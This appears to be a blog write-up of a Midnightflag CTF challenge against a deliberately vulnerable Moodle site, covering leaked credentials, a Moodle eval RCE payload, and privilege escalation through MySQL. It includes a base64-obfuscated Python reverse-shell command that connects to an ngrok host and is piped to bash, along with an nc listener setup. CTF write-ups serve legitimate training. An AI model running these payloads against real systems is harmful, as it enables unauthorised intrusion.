---
title: "Writeup : Midnightflag - Route Moi"
date: 2021-04-12T08:13:28+02:00
tags: ["writeup", "route-moi" ]
author: "Me"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "A Midnightflag challenge"
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowReadingTime: true

editPost:
    URL: "https://github.com/hironichu/ekko.pw/tree/main/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

## Introduction

Welcome, today im gonna share with you the work i made on the challenge route-moi, one of the real challenge in the midnightflag CTF that was running the night of the 10th of april 2021 

## Description of the challenge

The idea of th challenge is pretty easy, a student named Mel is running a website to sell and share hacking lesson like the root-me website, she installed a Moodle CMS website which is made to replace an old Wordpress instalation (take a note of this because it's very important).

>Sidenote : wordpress.


## Let's hack!

So, after running the docker instance, we have access to a moodle installation, and as my mate noticed the cms is running on an old version of moodle, which is known to be vulnerable to a RCE, but this CVE requires us to have some kind of permission within the CMS, which we don't have right on

When we land on the website we can see only one course :

![](https://cdn.discordapp.com/attachments/589917530219479051/831052522735009822/unknown.png "Moodle Guest access")

We are not allowed to bruteforce anything, which is fine because it would have taken too much time anyway. Let's log in the guest access and see what's what.

![](https://cdn.discordapp.com/attachments/589917530219479051/831053556042956800/unknown.png "Login page")

Here we have some information that are interesting, she shared her git profile here

`My personal git : https://github.com/melTHEboss/`

![](https://cdn.discordapp.com/attachments/589917530219479051/831053944981553212/unknown.png "Mel's github profile")

There is nothing much, but let's take a look at this only repo...

![](https://cdn.discordapp.com/attachments/589917530219479051/831054187752063016/unknown.png "Check the commit")

Hm ok, now as a git user or as a hacker you might see it right away but the commit in this picture doesn't look right, and if I am right..

>Thanks lightdiscord in my team for this finding btw!

![](https://cdn.discordapp.com/attachments/589917530219479051/831054616996085791/unknown.png "Woops")

Here we go, we got.. two password and two usernames, the one we seemed to be more interested about is meltheboss, because the other just is a Mysql user so let's focus on the access she has.

As the screenshot shows, we are a teacher on the moodle website, which is exactly what we needed !

![](https://cdn.discordapp.com/attachments/589917530219479051/831055702637150208/unknown.png) 


## Foothold

Now that we have much more than what is required to set the hack, let's see the different vulnerabilities on the moodle cms.

![](https://cdn.discordapp.com/attachments/589917530219479051/831056204816973824/unknown.png)

Well there is only one for our version, what's awesome is that this CVE is an RCE! 

Since I don't want to spend time on showing how this pos has been failing after multiple tries, let's just go and see the the CVE writeup online, which is what as a hacker you always should do instead of copying the poc and blindly executing it !

The CVE Writeup : [https://blog.ripstech.com/2018/moodle-remote-code-execution](https://blog.ripstech.com/2018/moodle-remote-code-execution)

Same here, I don't want to spend time writing a writeup about a writeup 😎, let's focus on the main bug, here the trick is to create a quizz and add a mathematical question which is normaly "secure" even though the cms uses an Eval in PHP, which is... just bad 
there is a problem with the safety check within the function that execute the code, which allows us to run code within the quizz page!

![](https://cdn.discordapp.com/attachments/589917530219479051/831057903237988402/unknown.png)

```
Here is the vulnerable code
 /*{a*/`$_GET[0]\`;//{x}}
```
Let's run this manually... 

- Create a quizz courses (or edit the one that already exist)

![](https://cdn.discordapp.com/attachments/589917530219479051/831059150581661757/unknown.png)
![](https://cdn.discordapp.com/attachments/589917530219479051/831060617069985802/unknown.png)

- Add the question

> Yes i made a video about it, because it was soo anoying to screenshot every step!
{{< youtube DKS4_w-Hofs >}}


Once this is done, you can continue and insert the get parameter we put,
![](https://cdn.discordapp.com/attachments/589917530219479051/831064766494539796/unknown.png)

And we can check if it worked :
![](https://cdn.discordapp.com/attachments/589917530219479051/831065190715752448/unknown.png)

🥳️ And here we go, we can now continue and pop a shell!

## Shell me to the moon 🌖

Here comes the part where, I always, always have issues and do thing differently from the others,
I could not start a reverse shell directly through the browser get parameter, whatever I tried to input, so the easiest way for me was just to upload a php-reverse-shell.php script and execute it in browser, it's way more easy to know if the payload is executed or not

For that I downloaded the shell from here (*well known shell script*)
[https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

You know the drill.. or maybe you don't

I want to show you some tips if you don't already know, the one most important of them all is

**NEVER OPEN PORTS IN YOUR ROUTER WHEN YOU DO EXTERNAL REVERSE SHELL!**
![](https://media1.tenor.com/images/2a077aec57e04dc42bdb8233261a5fb7/tenor.gif?itemid=12042935)

Do this only when you are in a VPN environement, such as Hackthebox,tryhackme etc..
openning port to enable reverse-shell within your IP is dangerous, and don't worry, if I say this it's because there are solution out there to execute reverse shell without impacting your network security.

The one holy program i want to promote : [NGROK](http://ngrok.io/)
ngrok is a simple yet very powerful service you can use in order to create tunnel from your network to the internet, so for exemple if you run a temporary dev website, tunnel your port 80 to ngrok servers, and ngrok will give you a random http url which is gonna tunnel the external trafic to you, so the people that does have access to this won't see where it's coming from or where it's going !

> Sidenote : Do not try to use this as a way of hidding your IP/network activity, if someone has access to a tunnel you create, and you use it to do bad stuff, they can easily communicate with ngrok in order to have your real IP. this is for ethical use only.

Now that you know this, and by the way this was not a sponsored part ! ( I whish it was ), let's continue.

```
With ngrok setup you can use this commands to setup your shell :

In one terminal : nc -lnvp 1337

In Another shell : ngrok tcp --region=eu 1337

(The region here is used in Europe but you can just not set it and it will default to US)

```
You will see something like this after running your ngrok tunnel :
![](https://cdn.discordapp.com/attachments/589917530219479051/831071542258565140/unknown.png)

Use the Forwarding adresses and port as the IP and PORT for the reverse shell.
in my case :
![](https://cdn.discordapp.com/attachments/589917530219479051/831072378729660476/unknown.png)

Next, I will show you another trick that you may or may not already know, to run a linux command withing an url without having to url-encode the hell out of it, I am gonna base64 encode the string and execute it with the base64 -d command in order to decode it.

![](https://cdn.discordapp.com/attachments/589917530219479051/831077921372241930/unknown.png)

```
You can use the following command in your browser to execute this :

echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjIudGNwLmV1Lm5ncm9rLmlvIiwxOTkzMCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7Jw=="|base64 -d|bash

```
And here we got a shell !
![](https://cdn.discordapp.com/attachments/589917530219479051/831078221062864896/unknown.png) 

We can continue to the escalation step to pivot to another user in order to get that flag!

## Escalation

Here come the smart part, because I already spent a lot of time writing, I think it's time to go straight to what we need to do, first if we check who we are, we are running a www-data user, which is not ok.

We can try the passwords we already have, but they won't work (too easy)

We can check the /home folder, we find that there is a melistheboss user, this user has the first flag !!

if you remember I said at the beginning that the wordpress part is important, we had two users and two password remember, let's log into mysql,

`mysql -u kira -p`

*Remember what the password was?*

Now that we are logged in, let's check what are the different DB

![](https://cdn.discordapp.com/attachments/589917530219479051/831080013973291058/unknown.png)

👀👀 what's that? Wordpress ?

`use wordpress;` (just if you want some SQL tips)

`show tables;`

`select * from wp_users;`

Hm this is interesting, whoever created this challenge wanted us to believe that wordpress uses base64 password but trust me, it doesnt ! this is complete bad practice, never, use, base64, as password hashing method !
![](https://cdn.discordapp.com/attachments/589917530219479051/831080510855839774/unknown.png)

Tbh, it's clear that this was base64 without even trying to find what it was X)
![](https://cdn.discordapp.com/attachments/589917530219479051/831080955666104364/unknown.png)

Now that we got this password, let's try ssh with meltheboss

![](https://cdn.discordapp.com/attachments/589917530219479051/831081651043696700/unknown.png)

Yay ! We got it 🥳️🥳️🥳️

![](https://cdn.discordapp.com/attachments/589917530219479051/831081822565433375/unknown.png)


## End note

Thanks for following this Write up, I took some time to make it, I wanted to make sure you could have fun reading into it as much as we had while hacking it!

I am planning on writing other writeup really soon, don't forget to let me know in github if you find some errors in this post, or if you feel like something is innapropriate.

Follow me on twitter @Ekk0x00.